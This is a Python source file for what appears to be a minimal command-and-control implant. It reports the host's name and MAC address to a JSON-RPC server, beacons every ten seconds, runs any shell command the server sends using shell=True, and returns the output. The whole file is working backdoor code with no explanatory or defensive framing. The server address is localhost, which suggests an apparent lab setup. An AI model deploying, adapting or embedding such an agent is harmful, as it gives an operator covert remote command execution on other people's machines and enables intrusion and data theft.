import urllib.request
import time
import uuid
import json
import socket
import subprocess


SERVER = "http://127.0.0.1:8000/rpc"
BEACON_INTERVAL = 10

def rpc(method, params=None):
    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params or {},
        "id": str(uuid.uuid4())
    }

    req = urllib.request.Request(
        SERVER,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            if res.status == 204:
                return None
            
            data = json.loads(res.read().decode())

            if "error" in data:
                err = data["error"]
                raise Exception(err["message"] if isinstance(err, dict) else err)
            
            return data.get("result")
        
    except Exception as e:
        print("[RPC ERROR]", e)
        return None

def get_hostname():
    return socket.gethostname()

def get_mac():
    mac = uuid.getnode()
    return ':'.join(f'{(mac >> ele) & 0xff:02x}'
                    for ele in range(40, -1, -8))

def identify():
    return rpc("identify", {
        "hostname": get_hostname(),
        "mac": get_mac(),
    })

def beacon():
    return rpc("beacon")

def run_shell(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        return result.stdout or result.stderr
    except Exception as e:
        return f"error: {e}"

def execute_task(task):
    if not task:
        return

    task_id = task.get("id", "unknown")
    method = task.get("method")
    params = task.get("params", {})

    print(f"[TASK] {task_id} | {method} -> {params}")

    handlers = {
        "print_message": lambda p: p.get("message"),
        "shell": lambda p: run_shell(p.get("cmd"))
    }

    try:
        handler = handlers.get(method)

        if handler:
            result = handler(params)
        else:
            result = "method not found"

    except Exception as e:
        result = f"execution error: {e}"
    
    send_result(task_id, result)

def send_result(task_id, output):
    rpc("task_result", {
        "task_id": task_id,
        "output": output
    })

def main():
    print("[*] loading profile...")

    result = identify()

    if not result:
        print("[-] failed to load profile")
        return
    
    print("[+] identified")
    
    while True:
        try:
            time.sleep(BEACON_INTERVAL)

            result = beacon()
            if not result:
                continue

            execute_task(result.get("task"))

        except Exception as e:
            print("[LOOP ERROR]", e)

if __name__ == "__main__":
    main()